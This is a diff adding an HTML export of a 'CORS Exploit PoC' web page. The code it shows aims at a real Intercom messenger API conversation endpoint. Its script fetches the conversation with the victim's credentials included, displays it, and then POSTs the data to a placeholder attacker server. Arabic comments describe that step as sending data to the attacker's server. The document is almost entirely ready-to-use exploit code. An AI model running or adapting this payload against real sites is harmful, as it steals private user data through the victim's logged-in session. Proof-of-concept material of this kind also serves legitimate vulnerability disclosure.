@@ -1,0 +1,53 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <meta http-equiv="Content-Style-Type" content="text/css">
+  <title></title>
+  <meta name="Generator" content="Cocoa HTML Writer">
+  <meta name="CocoaVersion" content="2113.65">
+  <style type="text/css">
+    p.p1 {margin: 0.0px 0.0px 0.0px 0.0px; font: 13.0px 'Helvetica Neue'; color: #ffffff}
+    p.p2 {margin: 0.0px 0.0px 0.0px 0.0px; font: 13.0px 'Helvetica Neue'; color: #52adf7}
+    p.p3 {margin: 0.0px 0.0px 0.0px 0.0px; font: 13.0px 'Helvetica Neue'; color: #ffffff; min-height: 15.0px}
+    p.p4 {margin: 0.0px 0.0px 0.0px 0.0px; text-align: left; font: 13.0px 'Geeza Pro'; color: #ffffff}
+    span.s1 {color: #ffffff}
+    span.s2 {font: 13.0px 'Helvetica Neue'}
+    span.s3 {font: 13.0px 'Geeza Pro'}
+  </style>
+</head>
+<body>
+<p class="p1">&lt;!DOCTYPE html&gt;&lt;html&gt;</p>
+<p class="p1">&lt;head&gt;</p>
+<p class="p1"><span class="Apple-converted-space">  </span>&lt;title&gt;CORS Exploit PoC&lt;/title&gt;</p>
+<p class="p1">&lt;/head&gt;</p>
+<p class="p1">&lt;body&gt;</p>
+<p class="p1"><span class="Apple-converted-space">  </span>&lt;h2&gt;Loading...&lt;/h2&gt;<span class="Apple-converted-space">  </span>&lt;script&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>async function exploit() {</p>
+<p class="p1"><span class="Apple-converted-space">      </span>try {</p>
+<p class="p2"><span class="s1"><span class="Apple-converted-space">        </span>const response = await fetch("</span>https://api-iam.intercom.io/messenger/web/conversations/215474041396551<span class="s1">", {</span></p>
+<p class="p1"><span class="Apple-converted-space">          </span>method: "GET",</p>
+<p class="p1"><span class="Apple-converted-space">          </span>credentials: "include"</p>
+<p class="p1"><span class="Apple-converted-space">        </span>});</p>
+<p class="p3"><br></p>
+<p class="p1"><span class="Apple-converted-space">        </span>const data = await response.text();</p>
+<p class="p3"><br></p>
+<p dir="rtl" class="p4"><span class="s2"><span class="Apple-converted-space">        </span>// </span>عرض<span class="s2"> </span>البيانات<span class="s2"> (</span>للدليل<span class="s2">)</span></p>
+<p class="p1"><span class="Apple-converted-space">        </span>document.body.innerHTML = "&lt;pre&gt;" + data + "&lt;/pre&gt;";<span class="Apple-converted-space">    </span>// <span class="s3">إرسال</span> <span class="s3">البيانات</span> <span class="s3">إلى</span> <span class="s3">سيرفر</span> <span class="s3">المهاجم</span></p>
+<p class="p2"><span class="s1"><span class="Apple-converted-space">    </span>await fetch("</span>https://YOUR-SERVER.com/log<span class="s1">", {</span></p>
+<p class="p1"><span class="Apple-converted-space">      </span>method: "POST",</p>
+<p class="p1"><span class="Apple-converted-space">      </span>body: data</p>
+<p class="p1"><span class="Apple-converted-space">    </span>});</p>
+<p class="p3"><br></p>
+<p class="p1"><span class="Apple-converted-space">  </span>} catch (e) {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>console.error(e);</p>
+<p class="p1"><span class="Apple-converted-space">  </span>}</p>
+<p class="p1">}</p>
+<p class="p3"><br></p>
+<p class="p1">exploit();</p>
+<p class="p3"><br></p>
+<p class="p1"><span class="Apple-converted-space">  </span>&lt;/script&gt;</p>
+<p class="p1">&lt;/body&gt;</p>
+<p class="p1">&lt;/html&gt;</p>
+</body>
+</html>
